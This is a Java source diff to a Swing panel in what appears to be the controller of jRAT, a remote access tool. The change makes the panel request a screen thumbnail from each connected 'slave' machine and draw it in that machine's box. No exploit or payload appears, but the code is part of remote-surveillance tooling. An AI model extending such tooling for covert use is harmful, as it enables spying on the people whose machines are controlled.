@@ -14,6 +14,8 @@ import javax.swing.JInternalFrame;
 import javax.swing.JMenu;
 
 import se.jrat.controller.AbstractSlave;
+import se.jrat.controller.Slave;
+import se.jrat.controller.packets.outgoing.Packet40Thumbnail;
 
 @SuppressWarnings("serial")
 public class PanelMainClientsBoxes extends PanelMainClients {
@@ -44,7 +46,11 @@ public class PanelMainClientsBoxes extends PanelMainClients {
 		box.setVisible(true);
 		
 		pane.add(box);
-		
+		if (slave.getThumbnail() == null) {
+			if (slave instanceof Slave) {
+				((Slave) slave).addToSendQueue(new Packet40Thumbnail());
+			}
+		}
 		align();
 	}
 	
@@ -156,6 +162,19 @@ public class PanelMainClientsBoxes extends PanelMainClients {
 		public SlaveBox(AbstractSlave slave) {
 			super(slave.getDisplayName(), true, true, true, true);
 			this.slave = slave;
+			
+			
+		}
+		
+		@Override
+		public void paint(Graphics g) {
+			super.paint(g);
+			
+			if (slave.getThumbnail() != null) {
+				Image image = slave.getThumbnail().getImage();
+				
+				g.drawImage(image, 0, 0, getWidth(), getWidth(), null);
+			}
 		}
 		
 		public AbstractSlave getSlave() {
